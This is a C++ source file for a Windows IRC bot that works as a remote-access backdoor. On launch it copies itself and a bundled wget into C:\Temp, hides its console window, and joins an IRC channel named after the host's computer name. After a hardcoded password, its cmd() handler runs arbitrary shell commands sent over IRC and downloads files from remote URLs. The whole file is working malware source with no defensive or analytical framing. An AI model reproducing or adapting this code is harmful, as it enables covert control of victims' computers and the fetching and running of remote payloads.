

#include <string>

#include <boost/asio.hpp>

#ifdef D_LIB
#include <dlib/all/source.cpp>
#endif


#include <iostream>
#include <istream>
#include <ostream>
#include <fstream>

#ifdef D_LIB
#include <dlib/logger.h>
#endif

#include <windows.h>
#include <time.h>
#include <process.h>
#include <tchar.h>
#include <sstream>
#define nln "\n"



using boost::asio::ip::tcp;

#ifdef D_LIB
using namespace dlib;
using namespace std;
#endif

#ifdef D_LIB
logger logcmd("cmd");
logger logCompname("Compname");
logger logdownload("download");
logger logFilecopier("Filecopier");
logger logfindassign("findassign");
logger logircConnect("ircConnect");
logger logmain("main");
logger logSplitfilename("Splitfilename");
logger logStealth("Stealth");
#endif


boost::asio::io_service io_service;
boost::asio::streambuf request;
boost::asio::streambuf response;



TCHAR nameBuf[MAX_COMPUTERNAME_LENGTH + 2];
DWORD nameBufSize;

void Compname(void);
void Verbose(int);
void cmd(void);
void Stealth(int x);


int sec,r,x,found,found2,found3,found4,found5,found6,found7,found8,found9,verb1=6,passwords=0;

std::string total,file2,path,resev,l,cont(""),MESSAGE,HOST,channel,
IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("Version 1.1"),str=("PRIVMSG ");


char *writable;
size_t starting_index = 0;
std::string const LETTERS ="abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ",NUMBERS = "0123456789";

void send_data()
{

}



void IrcConnect(std::string HOST,std::string channel )
{
        #ifdef D_LIB
        logircConnect << LINFO << "Has been started ";
        logircConnect << LINFO <<"Params IrcConnect("<<HOST<<","<<channel<<")";
        #endif

            std::ostream request_stream(&request);
            std::string REALNAME=("kebeqcn");

            tcp::resolver resolver(io_service);
            tcp::resolver::query query(HOST, "6667");
        #ifdef D_LIB
        logircConnect << LDEBUG << "Connecting to Host: "<<HOST;
        #endif
            tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
            tcp::socket socket(io_service);
            boost::asio::connect(socket, endpoint_iterator);

            NICK=nameBuf;
            //Form request stream
        {
        #ifdef D_LIB
        logircConnect << LINFO << "Forming Request stream";
        #endif
                boost::asio::write(socket, request);
                #ifdef D_LIB
                logircConnect << LDEBUG << "Sending :NICK "<<NICK;
                #endif
                request_stream << "NICK "<<NICK<<"\r\n";
                boost::asio::write(socket, request);
                request_stream << "USER guest tolmoon tolsun :"<<REALNAME<<"\r\n";
                boost::asio::write(socket, request);
                request_stream << "JOIN  "<<"#"<<channel<<"\r\n";

        #ifdef D_LIB
         logircConnect << LDEBUG << "Sending \\join "<<"#"<<channel;
        #endif
         #ifdef D_LIB
         logircConnect << LDEBUG<<"Sending request stream";
         #endif
                boost::asio::write(socket, request);

        }

        {
        boost::system::error_code error;
        #ifdef D_LIB
            logircConnect << LINFO << "Receiving data from "<<HOST;
        #endif
            while (boost::asio::read(socket, response,boost::asio::transfer_at_least(1), error))
                    {
                    std::istream response_stream(&response);
                        while (response_stream)
                                {
                            while (std::getline(response_stream, resev) && resev !="\r\n")
                                    {
                                        std::cout<<resev<<std::endl;
                                        #ifdef D_LIB
                                        logircConnect << LDEBUG <<"Received : \n\n"<<resev<<" \n";
                                        logircConnect << LDEBUG <<"Received : "<<resev.length()<<" Bytes.\n";
                                        #endif
                                        int ping=resev.find("PING",starting_index);
                                        if (ping!=-1)
                                                {
                                                    #ifdef D_LIB
                                                    logircConnect << LDEBUG << "Sending Pong  to: "<<HOST;
                                                    #endif
                                                    request_stream << "PONG "<<HOST<<"\r\n";
                                                    boost::asio::write(socket, request);
                                                }

                                        //Rem to change this to come after while loop
                                        std::string message=resev;
                                        std::string valid=(str+NICK+" :");
                                        int f =message.find(valid,starting_index);
                                        if (f!=-1)
                                                {
                                                    cont=message.substr(f+valid.length());
                                        #ifdef D_LIB
                                        logircConnect << LDEBUG << "Assigning relayed message";
                                        #endif
                                                    cmd();
                                                    if (msg.length()>1)
                                                        {
                                                            #ifdef D_LIB
                                                            logircConnect << LDEBUG<< "Sending response msg";
                                                            #endif


                                                            request_stream << msg<<"\r\n";
                                                            boost::asio::write(socket, request);
                                                            request.data();


                                                            #ifdef D_LIB
                                                            logircConnect << LDEBUG << "Clearing msg object";
                                                            #endif
                                                            msg.clear();
                                                        }
                                                }
                                        message.clear();
                                        /*end of commands*/


                                }

                            }
                }

        }

//catch comes here
}


void SplitFilename (const std::string& str)
{
    #ifdef D_LIB
    logSplitfilename << LINFO <<"Called with :"<<str<<" Params";
    #endif
        unsigned found = str.find_last_of("/\\");
        path=(str.substr(0,found)+("\\")) ;
        file2=(str.substr(found+1));
    #ifdef D_LIB
    logSplitfilename << LDEBUG << "Path is: "<<path<<" "<<"Filename is :"<<file2;
    #endif
}

int FileCopier(std::string sourcefile,std::string targetfilename,std::string targetdir)
{
    #ifdef D_LIB
    logFilecopier << LINFO << "Called with :"<<sourcefile<<" :"<<targetfilename<<" :"<<targetdir;
    #endif
        if (CreateDirectory (targetdir.c_str(), NULL),false)
                {
    #ifdef D_LIB
    logFilecopier << LWARN << "Failed to create dir :"<<targetdir;
    #endif
                }
        else
            ;
        std::string target=(targetdir+"\\"+targetfilename);
        if(CopyFile (sourcefile.c_str(), target.c_str(), false))
                {
     #ifdef D_LIB
    logFilecopier << LINFO << ":"<<sourcefile<<": copied successfully ";
    #endif
                }
        else
            {
     #ifdef D_LIB
    logFilecopier << LWARN<< "! :"<<sourcefile<<" Failed to copy";
    #endif
            }

return 0;
}
int findforme(std::string content,std::string str)
{
        int starting_index=0;
        int findings = content.find(str,starting_index);
        return findings;
}


int findassing(std::string beginsat,std::string content,std::string recipent)
{
    #ifdef D_LIB
    logfindassign<< LINFO << "Called with :"<<beginsat<<":"<<content<<":"<<recipent;
    #endif // D_LIB
        int starting_index=0;
        int index=0;
        index=content.find(beginsat.c_str(),starting_index);
        if (index>=0)
            {
                recipent.assign(content,index+beginsat.length(),content.length());
            }

        if (index>=0)
                return index;
        else
                return 0;
    #ifdef D_LIB
    logfindassign<< LINFO << "Exiting";
    #endif // D_LIB
}
 #ifdef D_LIB
void setup_loggers (int level)
{

    if (level==0)
    {
        logcmd.set_level(LFATAL);
        logCompname.set_level(LFATAL);
        logdownload.set_level(LFATAL);
        logFilecopier.set_level(LFATAL);
        logfindassign.set_level(LFATAL);
        logircConnect.set_level(LFATAL);
        logmain.set_level(LFATAL);
        logSplitfilename.set_level(LFATAL);
        logStealth.set_level(LFATAL);

    }

    if (level==1)
    {
        logcmd.set_level(LWARN);
        logCompname.set_level(LWARN);
        logdownload.set_level(LWARN);
        logFilecopier.set_level(LWARN);
        logfindassign.set_level(LWARN);
        logircConnect.set_level(LWARN);
        logmain.set_level(LWARN);
        logSplitfilename.set_level(LWARN);
        logStealth.set_level(LWARN);

    }
    else if (level==2)
    {
       logcmd.set_level(LINFO);
        logCompname.set_level(LINFO);
        logdownload.set_level(LINFO);
        logFilecopier.set_level(LINFO);
        logfindassign.set_level(LINFO);
        logircConnect.set_level(LINFO);
        logmain.set_level(LINFO);
        logSplitfilename.set_level(LINFO);
        logStealth.set_level(LINFO);
    }
        else if (level==3)
    {
        logcmd.set_level(LDEBUG);
        logCompname.set_level(LDEBUG);
        logdownload.set_level(LDEBUG);
        logFilecopier.set_level(LDEBUG);
        logfindassign.set_level(LDEBUG);
        logircConnect.set_level(LDEBUG);
        logmain.set_level(LDEBUG);
        logSplitfilename.set_level(LDEBUG);
        logStealth.set_level(LDEBUG);
    }
        else if (level==4)
    {
       logcmd.set_level(LTRACE);
        logCompname.set_level(LTRACE);
        logdownload.set_level(LTRACE);
        logFilecopier.set_level(LTRACE);
        logfindassign.set_level(LTRACE);
        logircConnect.set_level(LTRACE);
        logmain.set_level(LTRACE);
        logSplitfilename.set_level(LTRACE);
        logStealth.set_level(LTRACE);
    }
        else if (level==5)
    {
        logcmd.set_level(LALL);
        logCompname.set_level(LALL);
        logdownload.set_level(LALL);
        logFilecopier.set_level(LALL);
        logfindassign.set_level(LALL);
        logircConnect.set_level(LALL);
        logmain.set_level(LALL);
        logSplitfilename.set_level(LALL);
        logStealth.set_level(LALL);
    }
    if (level>=6)
    {
        verb1=0;
    }

}
#endif // D_LIB

void Verbose(int v)
{
#ifdef D_LIB
    setup_loggers(v);
#endif // D_LIB

}

void download (void)
{
    #ifdef D_LIB
    logdownload<< LINFO << "Started";
    logdownload<< LDEBUG<< "Calling system with :"<<total<<" params";
    #endif // D_LIB
        system(total.c_str());
    #ifdef D_LIB
    logdownload<< LINFO << "exiting";
    #endif // D_LIB
}

void Stealth(int x)
{
    #ifdef D_LIB
    logStealth<< LINFO << "Started";
    logStealth<<LINFO << "Switching the display mode";
     #endif // D_LIB
        HWND Stealth;
        AllocConsole();
        Stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(Stealth,x);/*show console app 1*/
        #ifdef D_LIB
        if (x==1)
            logStealth<< LDEBUG<<"Console Display mode is On";
        else
    logStealth<< LDEBUG<<"Console Display mode is Off";
    #endif // D_LIB
}

void cmd(void)
{
    #ifdef D_LIB
    logcmd<<LINFO << "Started";
    #endif // D_LIB
            found= cont.find("cmd");
            found2= cont.find("download");
            found3= cont.find("display");
            found4= cont.find("exit");
            found5=cont.find("Operater");
            found6=cont.find("Version");
            found7=cont.find("Kick");
            found8=cont.find("Password");
            found9=cont.find("Help");
     #ifdef D_LIB
    logcmd<<LDEBUG <<"Finished assigning find vars";
    #endif // D_LIB
    if (passwords ==1)
        {
        if (found!=-1)
            {
                #ifdef D_LIB
                logcmd<<LINFO <<"Inside cmd found";
                #endif // D_LIB
                std::cout<<"cmd is at"<<found<<std::endl;std::cout<<"size of cont is "<<cont.length()<<std::endl;
                comd= cont.substr(found+3);
                char * writable = new char[comd.size() + 1];
                copy(comd.begin(), comd.end(), writable);
                writable[comd.size()] = '\0';
                #ifdef D_LIB
                logcmd<<LDEBUG <<"Calling system with :"<<writable<<" params";
                #endif // D_LIB
                system(writable);
                #ifdef D_LIB
                logcmd<<LDEBUG <<"Sytem run commands are :"<<comd;
                #endif // D_LIB

            }
        if (found2!=-1)
            {
                #ifdef D_LIB
                logcmd<<LINFO <<"Inside download found 2";
                #endif // D_LIB
                /*update*/
                int f =cont.find("http",starting_index);
                int dl =cont.find("filename",starting_index);
                if (f!=-1)
                        {
                            E.assign(cont,f,cont.length());
                        }
                if (dl!=-1)
                        {
                            q.assign(cont,dl+9,cont.length());
                        }
                 #ifdef D_LIB
                logcmd<<LINFO <<"Completed http & filename finder";
                #endif // D_LIB
                if (E.length()>1&&q.length()>1)
                        {
                            std::string::size_type i = 0;
                            #ifdef D_LIB
                            logcmd<<LINFO <<"Inside download name assignment";
                            #endif // D_LIB
                            i = q.find('\r', i);
                            q.erase(i);
                            total ="wget "+E+" "+q;
                            #ifdef D_LIB
                            logcmd<<LINFO <<"Completed download name assignment with :"<<total<<" params";
                            #endif // D_LIB
                            download();
                            E.clear();
                            q.clear();
                            total.clear();
                        }
                }
        if (found3!=-1)
                {
                    #ifdef D_LIB
                    logcmd<<LINFO <<"Inside found 3 displaying the console window";
                     #endif // D_LIB
                    /*display*/
                    verb1++;
                    #ifdef D_LIB
                    logcmd<<LDEBUG<<"Verb1 is"<<verb1;
                    #endif // D_LIB
                    Verbose(verb1);
                    Stealth(1);

                }
        if (found4!=-1)
                {
                     #ifdef D_LIB
                    logcmd<<LDEBUG <<"Inside found 4 exiting....."<<verb1<<" params";
                     #endif // D_LIB
                    /*quit*/
                    exit(1);
                }
        if (found5!=-1)
                {
                    #ifdef D_LIB
                    logcmd<<LINFO <<"Inside found 5 sending Operater message";
                    #endif // D_LIB
                    /*msg*/
                    int f =cont.find("Operater",starting_index);
                    if (f!=-1)
                        {
                            std::string oper;
                            oper.assign(cont,f+9,cont.length());
                            msg=("MODE "+channel+" +o "+oper);
                             #ifdef D_LIB
                            logcmd<<LDEBUG <<"Creating operater with :"<<msg<<"params";
                            #endif // D_LIB
                        }
                }
        if (found6!=-1)
                {
                    #ifdef D_LIB
                    logcmd<<LINFO <<"Inside found 6 sending version string";
                    #endif // D_LIB
                    /*msg*/
                    msg=("PRIVMSG "+channel2)+version;
                    #ifdef D_LIB
                    logcmd<<LDEBUG <<"Version string :"<<msg;
                    #endif // D_LIB
                }
        if (found7!=-1)
                {
                #ifdef D_LIB
                logcmd<<LINFO <<"Inside found 7 sending kick string";
/*msg*/         #endif // D_LIB
                int f =cont.find("Kick",starting_index);
                if (f!=-1)
                        {
                            std::string kiked;
                            kiked.assign(cont,f+5,cont.length());
                            msg=("Kick "+channel+" "+kiked);
                            #ifdef D_LIB
                            logcmd<<LDEBUG <<"Kick string :"<<msg;
                             #endif // D_LIB
                        }

                    }
                if (found9!=-1)
                    {
                        #ifdef D_LIB
                        logcmd<<LINFO <<"Inside found 7 sending version string";
                        #endif // D_LIB
                        msg=("PRIVMSG "+channel2)+"Available Commands : cmd dir , Operater nick , Version , cmd wget address , display , Kick nick and Help to display this menu";

                        #ifdef D_LIB
                        logcmd<<LDEBUG<<"sending usage msg :"<<msg;
                        #endif // D_LIB
                    }
            }
    else
        msg=("PRIVMSG "+channel2)+"Enter password to continue.....";
            #ifdef D_LIB
            logcmd<<LDEBUG <<"Sending password wrng msg :"<<msg;
            #endif // D_LIB
                if (found8!=-1)
                    {
                        #ifdef D_LIB
                        logcmd<<LINFO <<"Password Checker string";
                        #endif // D_LIB
                        //Almost got mixed up just type in :Password DWORD
                        int x=cont.find ("DWORD");
                        if (x<0)
                        {
                            msg=("PRIVMSG "+channel2)+"Wrong password please try again";
                            #ifdef D_LIB
                            logcmd<<LDEBUG <<"Sending wrong password msg"<<msg;
                            #endif // D_LIB
                            passwords=0;
                        }
                        else if (x>=0)
                        {
                            msg=("PRIVMSG "+channel2)+"Correct password welcome";
                             #ifdef D_LIB
                            logcmd<<LDEBUG <<"Sending correct password msg :"<<msg;
                            #endif // D_LIB
                            passwords=1;

                        }
                x=0;
                    }
        #ifdef D_LIB
        logcmd<<LINFO <<"Clearing (cont & MESSAG) ";
        #endif // D_LIB
        MESSAGE.clear();
        cont.clear();
        #ifdef D_LIB
        logcmd<<LINFO <<"Exiting found ";
        #endif // D_LIB
}

void Compname(void)
{
#ifdef D_LIB
logCompname<<LINFO <<" :Started logging.";
#endif // D_LIB
    nameBufSize = sizeof nameBuf - 1;
        if (GetComputerName(nameBuf, &nameBufSize) == TRUE)
            {
            #ifdef D_LIB
            logCompname<<LINFO <<" :Assigned Computer name :"<<nameBuf;
            #endif
            }
#ifdef D_LIB
logCompname<<LINFO <<" :Exiting";
#endif // D_LIB
}








int main(int argc, char *argv[])
{
#ifdef D_LIB
std::ofstream os("logger.txt", std::ios_base::out);
set_all_logging_output_streams (os);
#endif // D_LIB
Verbose(5);
#ifdef D_LIB
logmain<<LINFO <<"Started";
#endif // D_LIB

HOST=("punch.wa.us.dal.net"),channel="kens";



    SplitFilename(argv[0]);
    if(path!="C:\\Temp\\")
        {
            FileCopier(file2,file2,"C:\\Temp\\");
            FileCopier("libgmp-10.dll","libgmp-10.dll","C:\\Temp\\");
            FileCopier("libgnutls-28.dll","libgnutls-28.dll","C:\\Temp\\");
            FileCopier("libhogweed-2-1.dll","libhogweed-2-1.dll","C:\\Temp\\");
            FileCopier("libidn-11.dll","libidn-11.dll","C:\\Temp\\");
            FileCopier("libintl-8.dll","libintl-8.dll","C:\\Temp\\");
            FileCopier("libnettle-4-3.dll","libnettle-4-3.dll","C:\\Temp\\");
            FileCopier("libp11-kit-0.dll","libp11-kit-0.dll","C:\\Temp\\");
            FileCopier("wget.exe","wget.exe","C:\\Temp\\");
            FileCopier("zlib1.dll","zlib1.dll","C:\\Temp\\");
            FileCopier("libiconv-2.dll","libiconv-2.dll","C:\\Temp\\");
        }


    Stealth(0);
    Compname();
    while (1)
            {
    #ifdef D_LIB
    logmain<<LINFO <<"Inside while loop";
    #endif // D_LIB
            try{
                IrcConnect(HOST,channel);
                } catch (const std::exception& ex) {
// ...
                } catch (const std::string& ex) {
                // ...
                } catch (...) {
                // ...
                }
    #ifdef D_LIB
    logmain<<LINFO <<"Sleeping for 6 seconds";
    #endif // D_LIB
    Sleep(6000);
                }
return 0;
}
